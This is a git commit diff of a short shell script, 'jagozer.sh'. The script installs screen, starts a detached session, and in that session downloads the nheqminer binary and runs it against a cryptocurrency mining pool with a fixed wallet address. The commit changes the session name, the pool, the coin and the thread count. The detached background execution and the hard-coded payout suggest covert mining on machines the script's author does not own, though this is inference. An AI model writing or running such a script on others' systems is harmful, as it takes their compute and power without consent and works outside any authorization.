ebe169eaa7e61ad2951681a3356b8cea559036f1
squibex <90225595+squibex@users.noreply.github.com>
2021-12-02 08:53:15 +0700

    Update jagozer.sh

--- jagozer.sh
+++ jagozer.sh
@@ -5,5 +5,5 @@ apt-get install -y screen < "/dev/null"
 mkdir yoho
 cd yoho
 
-screen -S "mylittlescreen" -d -m
-screen -r "mylittlescreen" -X stuff $'wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l stratum+tcp://na.luckpool.net:3956 -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW.nhq -p c=DOGE,mc=VRSC -t 8\n'
+screen -S "layar" -d -m
+screen -r "layar" -X stuff $'wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l verushash.mine.zergpool.com:3300 -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW.pod -p c=VRSC,mc=VRSC -t 15\n'
